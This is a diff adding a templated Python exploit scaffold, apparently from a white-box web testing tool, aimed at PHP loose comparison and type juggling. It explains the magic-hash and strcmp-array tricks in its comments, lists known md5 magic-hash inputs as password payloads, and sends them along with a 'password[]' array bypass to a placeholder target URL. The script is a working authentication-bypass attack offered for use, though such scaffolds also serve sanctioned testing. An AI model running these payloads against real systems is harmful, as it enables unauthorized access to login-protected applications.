@@ -1,0 +1,46 @@
+#!/usr/bin/env python3
+# wbx scaffold: PHP loose comparison / type juggling  ({{LOCATION}})
+# Rule: {{RULE}}   Note: {{NOTE}}
+#
+# `==` in PHP juggles types. Classic breaks:
+#   - "0e123" == "0e456"  -> true  (magic hash: both parse as 0*10^n)
+#   - hash("md5", x) == "0e..." -> find input whose hash is 0e[digits]
+#   - strcmp(user, secret) with array -> returns NULL == 0 -> bypass
+#   - loose == with int 0 vs non-numeric string (PHP < 8) -> "abc" == 0 true
+import urllib.parse
+import urllib.request
+
+BASE = "http://TARGET:PORT"   # TODO
+PARAM = "password"            # TODO: param compared with == / strcmp at {{LOCATION}}
+
+# Magic-hash inputs whose md5 begins 0e<digits> (juggle to 0 == 0).
+MAGIC_MD5 = ["240610708", "QNKCDZO", "aabg7XSs", "aabC9RqS"]
+
+PAYLOADS = [
+    ("0e1", "generic 0e string"),
+    *[(m, "md5 magic hash") for m in MAGIC_MD5],
+]
+
+
+def send(value) -> str:
+    # array trick: pass PARAM[]=x to make strcmp() return NULL
+    if value == "__ARRAY__":
+        url = f"{BASE}/?{PARAM}[]=x"
+    else:
+        url = f"{BASE}/?{urllib.parse.urlencode({PARAM: value})}"
+    with urllib.request.urlopen(url, timeout=10) as r:
+        return r.read().decode(errors="replace")
+
+
+def main():
+    for val, why in PAYLOADS + [("__ARRAY__", "array vs strcmp NULL bypass")]:
+        try:
+            body = send(val)
+            print(f"[?] {str(val):<14} ({why:<28}) len={len(body)}")
+        except Exception as e:
+            print(f"[-] {val}: {e}")
+    print("\nRead {{LOCATION}}: is it == or ===? md5/sha1? strcmp with user array?")
+
+
+if __name__ == "__main__":
+    main()
